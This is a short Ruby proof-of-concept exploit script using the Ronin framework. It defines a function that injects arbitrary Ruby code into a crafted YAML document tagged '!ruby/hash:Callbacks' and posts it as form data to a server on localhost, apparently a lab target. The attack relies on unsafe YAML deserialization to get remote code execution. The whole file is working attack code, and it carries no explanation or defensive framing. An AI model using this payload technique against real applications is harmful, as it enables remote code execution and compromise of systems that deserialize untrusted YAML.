#!/usr/bin/env ruby

begin
  require 'bundler/setup'
rescue LoadError => e
  warn e.message
  warn "Run `gem install bundler` to install Bundler."
  exit -1
end

require 'ronin/network/http'
require 'ronin/formatting/html'
require 'ronin/ui/output'
require 'yaml'

include Ronin::Network::HTTP
include Ronin::UI::Output::Helpers

def exploit(code)
  escaped_payload = "foo\nend\n#{code}\n__END__\n"

  yaml = %{
--- !ruby/hash:Callbacks
#{escaped_payload.dump}: true
  }.strip

  return http_post(
    url:       'http://localhost:9000/',
    form_data: {'data' => yaml}
  )
end
